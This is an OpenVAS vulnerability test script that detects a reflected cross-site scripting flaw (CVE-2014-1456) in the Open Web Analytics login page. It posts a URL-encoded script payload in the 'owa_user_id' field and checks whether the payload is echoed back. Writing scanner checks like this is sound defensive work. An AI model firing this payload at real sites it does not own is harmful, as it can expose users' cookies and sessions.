###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_web_analytics_owa_user_id_xss_vuln.nasl 6724 2017-07-14 09:57:17Z teissa $
#
# Open Web Analytics Reflected Cross-Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804404";
CPE = "cpe:/a:openwebanalytics:open_web_analytics";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6724 $");
  script_cve_id("CVE-2014-1456");
  script_bugtraq_id(65571);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-14 11:57:17 +0200 (Fri, 14 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-03-05 13:12:41 +0530 (Wed, 05 Mar 2014)");
  script_name("Open Web Analytics Reflected Cross-Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Open Web Analytics and is prone to cross-site
scripting vulnerability.";

  tag_vuldetect =
"Get the installed location with the help of detect NVT and check xss is
possible.";

  tag_insight =
"Input passed via the 'owa_user_id' parameter to the login page is not properly
sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in context of an affected site.

Impact Level: Application";

  tag_affected =
"Open Web Analytics version 1.5.5 and prior.";

  tag_solution =
"Upgrade to Open Web Analytics 1.5.6 or later,
For updates refer to http://downloads.openwebanalytics.com";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/56885");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/91124");
  script_xref(name : "URL" , value : "http://www.secureworks.com/cyber-threat-intelligence/advisories/SWRX-2014-004");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_open_web_analytics_detect.nasl");
  script_mandatory_keys("OpenWebAnalytics/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
host = "";
owaReq = "";
owaRes = "";
owaPort = "";

## Get HTTP Port
owaPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!owaPort){
  owaPort = 80;
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:owaPort)){
 exit(0);
}

## Construct attack request
postdata =  "owa_user_id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B" +
            "%3C%2Fscript%3E&owa_password=&owa_go=&owa_action=base.login" +
            "&owa_submit_btn=Login";

owaReq = string("POST ", dir, "/index.php HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata), "\r\n\r\n",
                 postdata);

## Send request and receive the response
owaRes = http_keepalive_send_recv(port:owaPort, data:owaReq);

## Confirm exploit worked by checking the response
if(owaRes =~ "HTTP/1\.. 200" && '">alert(document.cookie);">' >< owaRes &&
   ">Web Analytics<" >< owaRes)
{
  security_message(owaPort);
  exit(0);
}
